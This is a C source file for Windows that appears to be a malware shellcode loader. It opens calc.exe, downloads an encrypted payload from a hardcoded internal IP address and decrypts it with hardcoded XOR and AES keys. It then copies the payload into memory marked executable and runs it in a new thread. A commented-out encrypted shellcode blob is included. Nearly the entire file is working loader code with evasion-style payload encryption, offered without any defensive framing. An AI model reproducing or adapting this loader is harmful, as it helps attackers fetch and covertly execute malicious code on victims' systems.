#include <windows.h>
#include "aes.h"
#include <stdio.h>
#include <wininet.h>


BOOL downloadShellcode(LPCWSTR url, PBYTE* downloadedShellcode, SIZE_T* payloadSize) {
    
    BOOL success = 1;

    HINTERNET hInternet = InternetOpenW(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        BOOL success = 0;
        return success;
    }

    HINTERNET hUrl = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        BOOL success = 0;
        return success;
    }

    PBYTE shellcode = NULL;
    DWORD shellcodeSize = 0;
    DWORD bytesRead;
    BYTE buffer[1024];

    do {
        if (!InternetReadFile(hUrl, buffer, 1024, &bytesRead)) {
            free(shellcode);
            shellcode = NULL;
            break;
        }

        if (bytesRead > 0) {
            PBYTE temp = (PBYTE)realloc(shellcode, shellcodeSize + bytesRead);
            if (!temp) {
                free(shellcode);
                shellcode = NULL;
                break;
            }
            shellcode = temp;
            memcpy(shellcode + shellcodeSize, buffer, bytesRead);
            shellcodeSize += bytesRead;
        }
    } while (bytesRead > 0);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    *downloadedShellcode = shellcode;
    *payloadSize = shellcodeSize;

    return success;

}

void xorDecrypt(PBYTE payload, size_t payload_len, PBYTE key, size_t key_len) {
    for (size_t i = 0; i < payload_len; ++i) {
        payload[i] ^= key[i % key_len];
    }
}


int main() {

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA(NULL, "C:\\Windows\\System32\\calc.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);


    unsigned char key[] = { 'm','y','s','e','c','r','e','t','x','o','r','k','e','y' };
    unsigned char aeskey[] = "\x9a\xea\xe5\x60\x1c\x12\xa1\xd3\x0c\xa6\xf8\xd3\x3e\xb8\x06\x1c\x4f\x04\xe7\x66\xe5\x24\x1f\x39\x38\x03\x39\x03\xd2\x94\xaf\x68";
    unsigned char aesiv[] = "\xb0\x05\x9b\xc7\x6a\x40\xee\x06\x49\x08\xa2\x04\x3f\x9b\xcd\x12";

    PBYTE downloadedPayload = NULL;
    SIZE_T payloadSize = 0;
   
    LPCWSTR url = L"http://192.168.0.130/encrypted2.bin";
  
    BOOL success = downloadShellcode(url, &downloadedPayload, &payloadSize);
    
    unsigned char* shellcode = (unsigned char*)downloadedPayload;
     
    //unsigned char shellcode[] = "\xf7\xd1\xc9\x57\x43\x47\xc6\xbe\x5f\x4a\xe4\xac\x8b\xee\xc0\x63\xdd\x35\x3b\x0a\xdd\x69\xa0\x05\x50\xf9\xa5\x72\x6c\xfa\xea\x79\xcf\xeb\x53\xe9\xe3\xc7\x57\x45\x12\xd3\xf1\x9d\xa2\xc3\x25\xef\x06\xee\x19\x2e\x53\xf8\xaf\x6d\x55\x2e\xbb\x50\x4d\x1e\x83\xaf\x95\xf4\x82\x62\xea\x0a\xf6\x63\xe4\x4d\xd6\xde\x74\xb0\xaa\x64\xda\x07\x66\x14\x51\x65\xab\x4c\x27\xf7\xe7\x43\x3b\xa6\xb9\xd3\x83\x0f\x11\x62\x90\xd0\xfd\x13\x94\x51\xf1\xcb\xc8\xa5\x53\x9a\x24\x56\xaf\xec\xfc\x2e\xa0\xf5\x82\xf0\xd3\x81\x1d\x72\x74\x13\xdd\x93\x77\x26\x2a\xc5\x99\x07\x32\xf8\x8f\x04\xf9\x95\xdd\x01\xa0\x2c\x1f\x86\xad\x9d\x81\xc6\x48\xd3\x8a\x2d\x80\x95\xa7\x52\x1f\x64\x6d\xae\x70\xfe\x17\x4e\xb5\xf9\x12\x18\x40\xa3\x0b\x38\xfb\xf4\xed\xb0\x73\x42\xf9\xf3\x65\xaf\x1b\xbc\x66\x60\xff\x3c\xcb\xca\xbb\x4e\x0b\xc0\x3b\xdf\x35\xf4\xd4\x25\x9f\x62\x2b\xdb\x7d\x6f\x49\xf2\x3d\x37\xd8\x7a\x5a\xe7\x7a\x22\xce\x40\x24\x0f\x5b\xec\x37\x6d\x40\x7d\xd2\x8b\x4c\xf6\x3a\xa2\xb6\xdc\x8d\x25\xff\x66\xae\x75\xab\x69\x4d\x88\xa2\x05\x81\xc4\x7e\x19\xb2\x1c\x9d\x85\x3b\x55\x8a\xca\xa0\xb1\x28\x9f\x7a\x1c\x68\x1e\xa6\x24\xe3\xe9\x42\xa1\x26\x9d\xbb\xc4\x8c\x2f\x43\xfd\x45\xc2\x02\x9c\x64\x7e\x89\xa1\x81\xa9\x67\x55\x21\x08\x53\x1b\x2a\x65\xfe\x43\xec\x89\xaa\x4b\xe9\xb7\x9d\xdc\x5b\x38\x2f\xda\xd7\xf1\x65\x9e\xb6\x3e\x72\x02\x52\x67\xc8\x1e\x88\x0d\x7f\xa9\x83\x93\x05\xf9\x15\x40\x48\x12\x95\x8d\x5e\x44\x78\x3f\x5e\xff\x56\x5a\xf7\x17\x43\xa7\x0b\xe0\x8d\xd5\xba\x29\x95\x8b\x20\x75\x68\x05\xa6\xe9\x1f\x46\x0d\xc2\xd4\x3d\x7f\xd0\x72\x01\x67\x89\xb7\xd9\x4c\x51\xed\x6f\xdb\xb9\xc9\x5b\x47\x53\xc0\xbc\x86\x2e\x82\x85\xe1\x7e\x35\x66\xa5\xaa\x6c\x9e\x24\x8b\xcf\x2a\x21\xe5\x7f\x48\x64\xca\xa0\xae\xb8\x8a\xa6\xd7\x3d\xb7\xa5\xea\x9f\xb2\x85\x31\x97\x19\x56\xf4\x9c\x5e\x35\x25\xf1\x46\x5a\xce\x40\xd9\xce\xa0\xad\xd2\x2d\x94\x91\x7e\x00\xfb\xff\x74\x30\x32\x62\x38\xed\xbe\x8c\xe0\x84\xd8\xe6\x6f\x9d\x65\xf9\xea\xc1\xd7\x72\xbd\x5f\x29\x91\x80\xd1\x12\xdf\x5d\xaf\x44\x14\x6f\xb4\xad\x55\xd9\x11\x78\xaa\xbb\x1e\x7c\xf1\xc6\xf1\xaa\x97\x11\xfe\xd9\xe0\xf9\x8c\x26\xf3\x27";

    xorDecrypt(shellcode, payloadSize, key, sizeof(key));

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, aeskey, aesiv);
    AES_CBC_decrypt_buffer(&ctx, shellcode, payloadSize);
    
    PVOID pBuffer = VirtualAlloc(NULL, payloadSize +1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(pBuffer, shellcode, payloadSize);

    DWORD oldProtect = NULL;
    VirtualProtect(pBuffer, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtect);

    HANDLE hThread = CreateThread(NULL, 0, pBuffer, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    

    //clean
    CloseHandle(hThread);


    return 0;
}
